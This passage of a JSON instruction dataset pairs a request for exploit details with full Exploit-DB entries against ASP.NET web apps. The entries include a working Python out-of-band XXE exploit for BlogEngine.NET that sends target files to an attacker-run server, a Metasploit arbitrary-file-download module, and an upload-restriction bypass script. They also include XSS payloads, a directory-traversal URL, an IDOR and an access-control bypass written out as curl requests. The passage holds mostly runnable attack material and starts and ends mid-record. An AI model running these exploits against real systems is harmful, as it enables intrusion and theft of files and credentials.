            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Out-of-band XML External Entity Injection on BlogEngine.NET\n# Date: 19 June 2019\n# Exploit Author: Aaron Bishop\n# Vendor Homepage: https://blogengine.io/\n# Version: v3.3.7\n# Tested on: 3.3.7, 3.3.6\n# CVE : 2019-10718\n\n#1. Description\n#==============\n\n#BlogEngine.NET is vulnerable to an Out-of-Band XML External Entity\n#Injection attack on **/pingback.axd**.\n\n#2. Proof of Concept\n#=============\n\n#Host the following malicious DTD on a web server that is accessible to the\n#target system:\n\n#~~~\n#<!ENTITY % p1 SYSTEM \"file:///C:/Windows/win.ini\">\n#<!ENTITY % p2 \"<!ENTITY e1 SYSTEM 'http://$LHOST/X?%p1;'>\"> %p2\n#~~~\n\n#Submit a request to `pingback.axd` containing a malicious XML body:\n\n#~~~{command=\"REQUEST\"}\n#POST /pingback.axd HTTP/1.1\n#Host: $RHOST\n#Accept-Encoding: gzip, deflate\n#Connection: close\n#User-Agent: python-requests/2.12.4\n#Accept: */*\n#Content-Type: text/xml\n#Content-Length: 131\n\n#<?xml version=\"1.0\"?>\n#<!DOCTYPE foo SYSTEM \"http://$LHOST/ex.dtd\">\n#<foo>&e1;</foo>\n#<methodName>pingback.ping</methodName>\n#~~~\n\n#The application will request the remote DTD and submit a subsequent request\n#containing the contents of the file:\n\n#~~~\n#$RHOST - - [17/May/2019 12:03:32] \"GET /ex.dtd HTTP/1.1\" 200 -\n#$RHOST - - [17/May/2019 12:03:32] \"GET\n#/X?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1\n#HTTP/1.1\" 200 -\n#~~~\n\n#! /usr/bin/env python3\nimport argparse\nimport http.server\nimport json\nimport multiprocessing\nimport os\nimport re\nimport requests\nimport sys\nimport time\nimport urllib\n\n\"\"\"\nExploit for CVE-2019-10718\n\nCVE Identified by: Aaron Bishop\nExploit written by: Aaron Bishop\n\nSubmit a XML to the target, get the contents of the file in a follow up request from the target\n\npython3 CVE-2019-10718.py --rhost http://$RHOST --lhost $LHOST --lport $LPORT --files C:/Windows/win.ini C:/Users/Administrator/source/repos/BlogEngine.NET/BlogEngine/web.config C:/inetpub/wwwroot/iisstart.htm C:/Windows/iis.log C:/Users/Public/test.txt\n\nRequesting C:/Windows/win.ini ...\n$RHOST - - [16/May/2019 17:07:25] \"GET /ex.dtd HTTP/1.1\" 200 -\n$RHOST - - [16/May/2019 17:07:25] \"GET /X?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1 HTTP/1.1\" 200 -\n\nRequesting C:/Users/Administrator/source/repos/BlogEngine.NET/BlogEngine/web.config ...\n$RHOST - - [16/May/2019 17:07:26] \"GET /ex.dtd HTTP/1.1\" 200 -\nUnable to read C:/Users/Administrator/source/repos/BlogEngine.NET/BlogEngine/web.config\n\nRequesting C:/inetpub/wwwroot/iisstart.htm ...\n$RHOST - - [16/May/2019 17:07:30] \"GET /ex.dtd HTTP/1.1\" 200 -\nUnable to read C:/inetpub/wwwroot/iisstart.htm\n\nRequesting C:/Windows/iis.log ...\n$RHOST - - [16/May/2019 17:07:34] \"GET /ex.dtd HTTP/1.1\" 200 -\nUnable to read C:/Windows/iis.log\n\nRequesting C:/Users/Public/test.txt ...\n$RHOST - - [16/May/2019 17:07:38] \"GET /ex.dtd HTTP/1.1\" 200 -\n$RHOST - - [16/May/2019 17:07:38] \"GET /X?This%20is%20a%20test HTTP/1.1\" 200 -\n\n\"\"\"\n\nxml = \"\"\"<?xml version=\"1.0\"?>\n<!DOCTYPE foo SYSTEM \"http://{lhost}:{lport}/ex.dtd\">\n<foo>&e1;</foo>\n<methodName>pingback.ping</methodName>\n\"\"\"\n\ndtd = \"\"\"<!ENTITY % p1 SYSTEM \"file:///{fname}\">\n<!ENTITY % p2 \"<!ENTITY e1 SYSTEM 'http://{lhost}:{lport}/X?%p1;'>\"> %p2;\n\"\"\"\n\nproxies = {\n            \"http\": \"127.0.0.1:8080\",\n            \"https\": \"127.0.0.1:8080\"\n          }\n\nfile_queue = multiprocessing.Queue()\nresponse_queue = multiprocessing.Queue()\nresponse_counter = multiprocessing.Value('i', 0)\n\nclass S(http.server.SimpleHTTPRequestHandler):\n    server_version = 'A Patchey Webserver'\n    sys_version = '3.1415926535897932384626433832795028841971693993751058209749445923078'\n    error_message_format = 'Donde esta la biblioteca?'\n\n    def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-Type', 'application/xml')\n            self.end_headers()\n\n    def do_GET(self):\n        if self.path.endswith(\".dtd\"):\n            self._set_headers()\n            self.wfile.write(dtd.format(fname=file_queue.get(), lhost=self.lhost, lport=self.lport).encode('utf-8'))\n        elif self.path.startswith(\"/X\"):\n            self._set_headers()\n            response_counter.value += 1\n            response_queue.put(self.path)\n            self.wfile.write('<response>Thanks</response>'.encode('utf-8'))\n        else:\n            self._set_headers()\n            self.wfile.write('<error>?</error>')\n\n\ndef start_server(lhost, lport, server):\n    httpd = http.server.HTTPServer((lhost, lport), server)\n    httpd.serve_forever()\n\ndef main(rhost, lhost, lport, files, timeout, proxy, output_dir):\n    print(output_dir)\n    if not output_dir:\n        return\n    for f in files:\n        file_queue.put_nowait(f)\n\n    server = S\n    server.lhost, server.lport = lhost, lport\n    p = multiprocessing.Process(target=start_server, args=(lhost,lport,server))\n    p.start()\n    for num, f in enumerate(files):\n        print(\"\\nRequesting {} ...\".format(f))\n        count = 0\n        r = requests.post(rhost + \"/pingback.axd\", data=xml.format(lhost=lhost, lport=lport), proxies=proxies if proxy else {}, headers={\"Content-Type\": \"text/xml\"})\n        response = True\n        while num == response_counter.value:\n            if count >= timeout:\n                response = False\n                response_counter.value += 1\n                print(\"Unable to read {}\".format(f))\n                break\n            time.sleep(1)\n            count += 1\n        if response:\n            os.makedirs(output_dir, exist_ok=True)\n            with open(\"{}/{}\".format(output_dir, os.path.splitdrive(f)[1].replace(':','').replace('/','_')), 'w') as fh:\n                fh.write(urllib.parse.unquote(response_queue.get()).replace('/X?',''))\n\n    p.terminate()\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10718 OOB XXE')\n    parser.add_argument('-r', '--rhost', action=\"store\", dest=\"rhost\", required=True, help='Target host')\n    parser.add_argument('-l', '--lhost', action=\"store\", dest=\"lhost\", required=True, help='Local host')\n    parser.add_argument('-p', '--lport', action=\"store\", dest=\"lport\", type=int, required=True, help='Local port')\n    parser.add_argument('-f', '--files', nargs='+', default=\"C:/Windows/win.ini\", help='Files to read on RHOST')\n    parser.add_argument('-t', '--timeout', type=int, default=3, help='How long to wait before moving on to next file')\n    parser.add_argument('-x', '--proxy', dest=\"proxy\", action=\"store_true\", default=False, help='Pass requests through a proxy')\n    parser.add_argument('-o', '--output', nargs='?', default=\"./CVE-2019-10718\", help='Output directory.  Default ./CVE-2019-10718')\n    args = parser.parse_args()\n\n    if isinstance(args.files, str):\n        args.files = [args.files]\n    main(args.rhost, args.lhost, args.lport, args.files, args.timeout, args.proxy, args.output)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 41086",
        "output": {
            "ID": "41086",
            "File": "exploits/aspx/webapps/41086.txt",
            "Description": "Check Box 2016 Q2 Survey - Multiple Vulnerabilities",
            "Date Published": "2017-01-17",
            "Author": "Fady Mohammed Osman",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-01-17",
            "Date Updated": "2017-01-17",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Check Box 2016 Q2 Survey Multiple Vulnerabilities\n# Exploit Author: Fady Mohamed Osman (@fady_osman)\n# Exploit-db : http://www.exploit-db.com/author/?a=2986\n# Youtube : https://www.youtube.com/user/cutehack3r\n# Date: Jan 17, 2017\n# Vendor Homepage: https://www.checkbox.com/\n# Software Link: https://www.checkbox.com/free-checkbox-trial/\n# Version: Check Box 2016 Q2,Check Box 2016 Q4  - Fixed in Checkbox Survey,\nInc. v6.7\n# Tested on: Check Box 2016 Q2 Trial on windows Server 2012.\n# Description : Checkbox is a survey application deployed by a number of\nhighly profiled companies and government entities like Microsoft, AT&T,\nVodafone, Deloitte, MTV, Virgin, U.S. State Department, U.S. Secret\nService,  U.S. Necular Regulatory Comission, UNAIDS, State Of California\nand more!!\n\nFor a full list of their clients please visit:\nhttps://www.checkbox.com/clients/\n\n1- Directory traversal vulnerability : For example to download the\nweb.config file we can send a request as the following:\nhttp://www.example.com/Checkbox/Upload.ashx?f=..\\..\\web.config&n=web.config\n\n2- Direct Object Reference :\nattachments to surveys can be accessed directly without login as the\nfollowing:\nhttps://www.victim.com/Checkbox/ViewContent.aspx?contentId=5001\nI created a script that can bruteforce the numbers to find ID's that will\ndownload the attachment and you can easily write one on your own ;).\n\n3- Open redirection in login page for example:\nhttps://www.victim.com/Checkbox/Login.aspx?ReturnUrl=http://www.google.com\n\nIf you can't see why an open redirection is a problem in login page please\nvisit the following page:\nhttps://www.asp.net/mvc/overview/security/preventing-\nopen-redirection-attacks\n\n\nTimeline:\nDecember 2016 - Discovered the vulnerability during Pen. Test conducted by\nZINAD IT for one of our clients.\nJan 12,2017 - Reported to vendor.\nJan 15,2017 - Sent a kind reminder to the vendor.\nJan 16,2017 - First Vendor Response said they will only consider directory\ntraversal as a vulnerability and that a fix will be sent in the next day.\nJan 16,2017 - Replied to explain why DOR and Open Redirect is a problem.\nJan 17,2017 - Patch Release Fixed the Directory Traversal.\nJan 17,2017 - Sent another email to confirm if DOR and open redirect wont\nbe fixed.\nJan 17,2017 - Open redirection confirmed to be fixed in the same patch\nreleased before for DOR the vendor said they didn't believe that's a\nsecurity concern and that they have added a warning to let users know that\ntheir attachments will be available to anyone with access to that survey page !!"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48125",
        "output": {
            "ID": "48125",
            "File": "exploits/aspx/webapps/48125.txt",
            "Description": "DotNetNuke 9.5 - File Upload Restrictions Bypass",
            "Date Published": "2020-02-24",
            "Author": "Sajjad Pourali",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2020-02-24",
            "Date Updated": "2020-02-24",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: DotNetNuke 9.5 - File Upload Restrictions Bypass\n# Date: 2020-02-23\n# Exploit Author: Sajjad Pourali\n# Vendor Homepage: http://dnnsoftware.com/\n# Software Link: https://github.com/dnnsoftware/Dnn.Platform/releases/download/v9.5.0/DNN_Platform_9.5.0_Install.zip\n# Version: <= 9.5\n# CVE : N/A\n# More Info: https://medium.com/@SajjadPourali/dnn-dotnetnuke-cms-not-as-secure-as-you-think-e8516f789175\n\nThe DNN has a file upload module for superuser. As a superuser, you can upload files with the following formats \u2014 \u201cjpg, jpeg, jpe, gif, bmp, png, svg, ttf, eot, woff, doc, docx, xls, xlsx, ppt, pptx, pdf, txt, xml, xsl, xsd, css, zip, rar, template, htmtemplate, ico, avi, mpg, mpeg, mp3, wmv, mov, wav, mp4, webm, ogv\u201d.\n\nAs a normal user you are allowed to upload files with \u201cbmp,gif,ico,jpeg,jpg,jpe,png,svg\u201d extensions. The same file upload module used for superuser is reused for normal users with extra validation for a few additional extensions e.g. CSS extension is not allowed.\n\nUnfortunately, only for superuser, whitelisted extension check is performed at the server end. For normal users, extra extension validation is performed at client-side only. Hence, a low privileged normal user can bypass the client-side validation and upload files with extensions which are allowed only for superuser only.\n\nFor example, a normal privileged user can upload a file with extension which is allowed only for superuser, by executing the following code on a browser\u2019s console (in the tab that manages profile\u2019s page has opened). This attack may also be performed using proxy tools such as Burp, ZAP etc.\n\ndnn.createFileUpload({\n    \"clientId\": \"dnn_ctr_EditUser_Profile_ProfileProperties_Photo_PhotoFileControl_FileUploadControl\",\n    \"moduleId\": \"\",\n    \"parentClientId\": null,\n    \"showOnStartup\": true,\n    \"folderPicker\": {\n        \"selectedItemCss\": \"selected-item\",\n        \"internalStateFieldId\": null,\n        \"disabled\": false,\n        \"selectItemDefaultText\": \"\",\n        \"initialState\": {\n            \"selectedItem\": {\n                \"key\": \"0\",\n                \"value\": \"My Folder\"\n            }\n        },\n        \"onSelectionChanged\": []\n    },\n    \"maxFileSize\": 299892736,\n    \"maxFiles\": 0,\n    \"extensions\": [\"jpg\", \"jpeg\", \"jpe\", \"gif\", \"bmp\", \"png\", \"svg\", \"ttf\", \"eot\", \"woff\", \"doc\", \"docx\", \"xls\", \"xlsx\", \"ppt\", \"pptx\", \"pdf\", \"txt\", \"xml\", \"xsl\", \"xsd\", \"css\", \"zip\", \"rar\", \"template\", \"htmtemplate\", \"ico\", \"avi\", \"mpg\", \"mpeg\", \"mp3\", \"wmv\", \"mov\", \"wav\", \"mp4\", \"webm\", \"ogv\"],\n    \"resources\": {\n        \"title\": \"Upload Files\",\n        \"decompressLabel\": \"Decompress Zip Files\",\n        \"uploadToFolderLabel\": \"Upload To:\",\n        \"dragAndDropAreaTitle\": \"Drag files here or click to browse\",\n        \"uploadFileMethod\": \"Upload File\",\n        \"uploadFromWebMethod\": \"From URL\",\n        \"closeButtonText\": \"Close\",\n        \"uploadFromWebButtonText\": \"Upload\",\n        \"decompressingFile\": \"Decompressing File\",\n        \"fileIsTooLarge\": \"File size bigger than 286. Mb\",\n        \"fileUploadCancelled\": \"Upload cancelled\",\n        \"fileUploadFailed\": \"Upload failed\",\n        \"fileUploaded\": \"File uploaded\",\n        \"emptyFileUpload\": \"Your browser does not support empty file uploads.\",\n        \"fileAlreadyExists\": \"The file you want to upload already exists in this folder.\",\n        \"uploadStopped\": \"File upload stopped\",\n        \"urlTooltip\": \"Enter Resource URL like https://SomeWebSite.com/Images/About.png\",\n        \"keepButtonText\": \"Keep\",\n        \"replaceButtonText\": \"Replace\",\n        \"tooManyFiles\": \"You cannot upload more than {0} file(s) at once.\",\n        \"invalidFileExtensions\": \"Some selected files with invalid extensions are excluded from upload.  You can only upload files with the following extensions: bmp, gif, ico, jpeg, jpg, jpe, png, svg.\",\n        \"unzipFilePromptTitle\": \"Unzip Information\",\n        \"unzipFileFailedPromptBody\": \"<div class=\\\"invalidFiles\\\"><p>[COUNT] of [TOTAL] file(s) were not extracted because their file types are not supported:</p>[FILELIST]</div>\",\n        \"unzipFileSuccessPromptBody\": \"<div class=\\\"validFiles\\\"><p>[TOTAL] of [TOTAL] file(s) were extracted successfully.</p></div>\",\n        \"errorDialogTitle\": \"Error\"\n    },\n    \"width\": 780,\n    \"height\": 630,\n    \"folderPath\": dnn.dnnFileUpload.settings.dnn_ctr_EditUser_Profile_ProfileProperties_Photo_PhotoFileControl_dnnFileUploadScope.folder,\n    \"parameters\": {}\n});"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48124",
        "output": {
            "ID": "48124",
            "File": "exploits/aspx/webapps/48124.txt",
            "Description": "DotNetNuke 9.5 - Persistent Cross-Site Scripting",
            "Date Published": "2020-02-24",
            "Author": "Sajjad Pourali",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2020-02-24",
            "Date Updated": "2020-02-24",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comDNN_Platform_9.5.0_Install.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: DotNetNuke 9.5 - Persistent Cross-Site Scripting\n# Date: 2020-02-23\n# Exploit Author: Sajjad Pourali\n# Vendor Homepage: http://dnnsoftware.com/\n# Software Link: https://github.com/dnnsoftware/Dnn.Platform/releases/download/v9.5.0/DNN_Platform_9.5.0_Install.zip\n# Version: <= 9.5\n# CVE : N/A\n# More Info: https://medium.com/@SajjadPourali/dnn-dotnetnuke-cms-not-as-secure-as-you-think-e8516f789175\n\nDNN allows normal users to upload XML files by using journal tools in their profile. An attacker could upload XML files which may execute malicious scripts in the user\u2019s browser.\n\nIn XML, a namespace is an identifier used to distinguish between XML element names and attribute names which might be the same. One of the standard namespaces is \u201chttp://www.w3.org/1999/xhtml\u201d which permits us to run XHTML tags such as <script>.\n\nFor instance, uploading the following code as an XML file executes javascript and shows a non-harmful \u2018XSS\u2019 alert.\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<script xmlns=\"http://www.w3.org/1999/xhtml\">\n alert('XSS');\n</script>\n\nThough stealing of authentication cookies are not possible at this time (because the authentication\u2019s cookies are set as HttpOnly by default), XSS attacks are not limited to stealing users\u2019 cookies. Using XSS vulnerability, an attacker can perform other more damaging attacks on other or high privileged users, for example, bypassing CSRF protections which allows uploading \u201caspx\u201d extension files through settings page which leads to upload of backdoor files."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43405",
        "output": {
            "ID": "43405",
            "File": "exploits/aspx/webapps/43405.rb",
            "Description": "DotNetNuke DreamSlider 01.01.02 - Arbitrary File Download (Metasploit)",
            "Date Published": "2017-12-27",
            "Author": "Glafkos Charalambous",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-12-27",
            "Date Updated": "2017-12-28",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: DotNetNuke DreamSlider Arbitrary File Download\n# Date: 23/01/2014\n# Author: Glafkos Charalambous\n# Version: 01.01.02\n# Vendor: DreamSlider\n# Vendor URL: http://www.dreamslider.com/\n# Google Dork: inurl:/DesktopModules/DreamSlider/\n# CVE:\n#\n# Description\n# DotNetNuke DreamSlider Module prior to version X suffer from a remote unauthenticated arbitrary file download vulnerability\n#\n# Vulnerable Code\n#\n# namespace DotNetNuke.Modules.DreamSlider\n# {\n#    using System;\n#    using System.IO;\n#    using System.Web.SessionState;\n#    using System.Web.UI;\n#\n#    public class DownloadProvider : Page, IRequiresSessionState\n#    {\n#        protected void Page_Load(object sender, EventArgs e)\n#        {\n#            if (!base.IsPostBack && (base.Request.QueryString[\"File\"] != null))\n#            {\n#                string path = base.Request.QueryString[\"File\"];\n#                string fileName = Path.GetFileName(path);\n#                base.Response.ContentType = \"application/octet-stream\";\n#                base.Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);\n#                base.Response.WriteFile(path);\n#                base.Response.End();\n#            }\n#        }\n#    }\n# }\n\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Auxiliary\n  Rank = ExcellentRanking\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'DotNetNuke DreamSlider Arbitrary File Download',\n      'Description'    => %q{\n        This module exploits an unauthenticated arbitrary file download vulnerability in DNN\n\tDreamSlider version 01.01.02 and below.\n      },\n      'Author'         =>\n        [\n          'Glafkos Charalambous', # Discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://metasploit.com' ]\n        ],\n      'DisclosureDate' => 'Mar 23 2015'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('FILENAME', [true, 'File to download', '~/web.config']),\n        OptString.new('PATH', [true, 'Path of DNN Nuke', '/']),\n      ], self.class)\n  end\n\n  def check\n    begin\n\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(datastore['PATH'],\"/DesktopModules/DreamSlider/DownloadProvider.aspx\"),\n        'cookie' => datastore['Cookie'],\n      })\n\n    if res && res.code == 200 and res.body.to_s =~ /Download Provider/\n       return Exploit::CheckCode::Vulnerable\n    else\n       return Exploit::CheckCode::Safe\n    end\n    Exploit::CheckCode::Safe\n   end\n  end\n\n  def run\n    begin\n      print_status(\"#{peer} - Downloading file #{datastore['FILENAME']}\")\n\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(datastore['PATH'],\"/DesktopModules/DreamSlider/DownloadProvider.aspx?File=\") + datastore['FILENAME'],\n\t'cookie' => datastore['Cookie'],\n      })\n\n    rescue Rex::ConnectionError\n      print_error(\"#{peer} - Could not connect.\")\n      return\n    end\n\n    if res && res.code == 200\n      if res.body.to_s.bytesize == 0\n        print_error(\"#{peer} - 0 bytes returned, file does not exist or it is empty.\")\n        return\n      end\n\n      fileName = datastore['FILENAME']\n\n      path = store_loot(\n        'ds.http',\n        'application/octet-stream',\n        datastore['RHOST'],\n        res.body,\n        fileName\n      )\n      print_good(\"#{peer} - File saved in: #{path}\")\n    else\n      print_error(\"#{peer} - Failed to download file.\")\n    end\n  end\nend"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45577",
        "output": {
            "ID": "45577",
            "File": "exploits/aspx/webapps/45577.txt",
            "Description": "Ektron CMS 9.20 SP2 - Improper Access Restrictions",
            "Date Published": "2018-10-10",
            "Author": "alt3kx",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-10-10",
            "Date Updated": "2018-10-10",
            "Verified": "0",
            "Codes": [
                "CVE-2018-12596"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Details\n================\nSoftware: Ektron Content Management System (CMS)\nVersion: 9.20 SP2\nHomepage: https://www.episerver.com\nAdvisory report: https://github.com/alt3kx/CVE-2018-12596\nCVE: CVE-2018-12596\nCVSS: 7.5 (HIGH: (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\nCWE-284\n\nDescription\n================\nEktron CMS 9.20 SP2 allows remote attackers to enable users.\n\nVulnerability\n================\nEktron CMS 9.20 SP2 allows remote attackers to call aspx pages via the \"activateuser.aspx\" page, even if a page\nis located under the /WorkArea/ path, which is forbidden (normally available exclusively for local admins).\n\nProof of concept Exploit\n========================\n\nPre-requisites:\n\n- curl command deployed (Windows or Linux)\n- Burpsuite Free/Pro deployed or any other WebProxy to catch/send GET request\n\nStep (1): Launch the BurpSuite with default paramenter then request the follwing URL:\n\nTarget: https://ektronserver.com/WorkArea/activateuser.aspx\n\nNormally you will see a 403 Forbidden: Access denied.\n\nStep (2): Into BurpSuite Free/Pro add the following extra Header Referer:\n\n\"Referer: ALEX;\"\n\nStep (3): The offending GET request is:\n\nGET /WorkArea/activateuser.aspx HTTP/1.1\nHost: ektronserver.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0\nReferer: ALEX;\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\n\nStep (4): Test your GET request using curl command and burpsuite as following:\n\n# curl -i -s -k -XGET \"https://ektronserver.com/WorkArea/activateuser.aspx\"\n-H \"Host: ektronserver.com\"\n-H \"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0\"\n-H \"Referer: ALEX;\"\n-H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"\n-H \"Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate\"\n-H \"Connection: close\"\n--proxy http://127.0.0.1:8080\n\nYou should see now the following response 200 OK!:\n\nHTTP/1.0 200 Connection established\n\nHTTP/1.1 200 OK\nCache-Control: private\nContent-Type: text/html; charset=utf-8\n\nNow you got access to enable users, just send the repeat request into the browser using burpsuite\n\nHave fun!\n\nMitigations\n================\nInstall the latest patches available here:\n\nPATCH ID: EKTR-508: Security enhancement for re-enabling a user\nhttps://support.episerver.com/hc/en-us/articles/115002828112-9-2-SP2-Site-Update\n\nAny of the below should fix CVE-2018-12596\n\n9.3(main release)\n9.2 SP2 Site CU 22\n9.1 SP3 Site CU 45\n9.0 SP3 Site CU 31\n\nDisclosure policy\n================\nWe believes in responsible disclosure.\nPlease contact us on Alex Hernandez aka alt3kx  (at) protonmail com to acknowledge this report.\n\nThis vulnerability will be published if we do not receive a response to this report with 10 days.\n\nTimeline\n================\n2018\u201306\u201308: Discovered\n2018\u201306\u201311: Retest staging environment\n2018\u201306\u201312: Restes live environment\n2018\u201306\u201319: Internal communication\n2018\u201306\u201321: Vendor notification\n2018\u201306\u201321: Vendor feedback\n2018\u201306\u201329: Vendor feedback product will be patched\n2018\u201306\u201329: Patch available\n2018\u201306\u201329: Agrements with the vendor to publish the CVE/Advisory.\n2018\u201307\u201330: Internal communication\n2018\u201309\u201315: Patches tested on LAB environment.\n2018\u201310\u201308: Public report\n\nDiscovered by:\nAlex Hernandez aka alt3kx:\n================\nPlease visit https://github.com/alt3kx for more information.\nMy current exploit list @exploit-db: https://www.exploit-db.com/author/?a=1074"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51200",
        "output": {
            "ID": "51200",
            "File": "exploits/aspx/webapps/51200.txt",
            "Description": "ELSI Smart Floor V3.3.3 - Stored Cross-Site Scripting (XSS)",
            "Date Published": "2023-04-01",
            "Author": "Rob_ CTRL Group",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2023-04-01",
            "Date Updated": "2023-04-01",
            "Verified": "0",
            "Codes": [
                "CVE-2022-35543"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: ELSI Smart Floor V3.3.3 - Stored Cross-Site Scripting (XSS)\n# Date: 12/09/2022\n# Exploit Author: Rob, CTRL Group\n# Vendor Homepage: marigroup.com\n# Version: V3.3.3 and under\n# Tested on: Windows IIS all versions\n# CVE : CVE-2022-35543\n\n\u201cStored Cross-Site Scripting\u201d Vulnerability within the Elsi Smart Floor software. This vulnerability does require authentication however, once the payload is stored, any user visiting the portal will trigger the alert.\n\nLogin to the appplication\n\nBrowse to \"Settings\" tab and tehn \" Wards\". Create a new word with the following payload at the ward name:\n\n\n <script>alert(document.cookie)</script>\n\n\nAny user browsing the application will trigger the payload."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 44831",
        "output": {
            "ID": "44831",
            "File": "exploits/aspx/webapps/44831.txt",
            "Description": "EMS Master Calendar < 8.0.0.20180520 - Cross-Site Scripting",
            "Date Published": "2018-06-04",
            "Author": "Chris Barretto",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-06-04",
            "Date Updated": "2018-06-05",
            "Verified": "0",
            "Codes": [
                "CVE-2018-11628"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: EMS Master Calendar < 8.0.0.20180520 - Reflected Cross-Site Scripting\n# Date:  2018-06-01\n# Exploit Author: Chris Barretto\n# Vendor Homepage: https://www.emssoftware.com/\n# Software Link: https://docs.emssoftware.com/Content/V44.1_ReleaseNotes.htm\n# Version: Versions prior to 8.0.0.201805210 are vulnerable\n# Tested on: Master Calendar v8.0.0.127\n# CVE : CVE-2018-11628\n\n# 1. Description:\n# Data input into EMS Master Calendar before 8.0.0.201805210 via URL parameters are not properly sanitized,\n# allowing malicious attackers to send a crafted URL and execute code in the context of the user's browser.\n\n#2. Proof of concept:\n# The following PoC URL is available:\nhttps://example.com/MasterCalendar/RssFeeds.aspx?Name=abc<script>alert('XSS')</script>xyz"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 49508",
        "output": {
            "ID": "49508",
            "File": "exploits/aspx/webapps/49508.txt",
            "Description": "H8 SSRMS - 'id' IDOR",
            "Date Published": "2021-02-01",
            "Author": "Mohammed Farhan",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-02-01",
            "Date Updated": "2021-02-01",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: H8 SSRMS - 'id' IDOR\n# Date: 01/31/2021\n# Exploit Author: Mohammed Farhan\n# Vendor Homepage: https://www.height8tech.com/\n# Version: H8 SSRMS\n# Tested on: Windows 10\n\n\nVulnerability Details\n======================\nLogin to the application\nNavigate to Payment Section and Click on Print button.\nIn QuotePrint.aspx, modify the id Parameter to View User details, Address,\nPayments, Phonenumber and Email of other Users"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42687",
        "output": {
            "ID": "42687",
            "File": "exploits/aspx/webapps/42687.txt",
            "Description": "ICEstate 1.1 - 'id' SQL Injection",
            "Date Published": "2017-09-13",
            "Author": "Ihsan Sencan",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-09-13",
            "Date Updated": "2017-09-13",
            "Verified": "0",
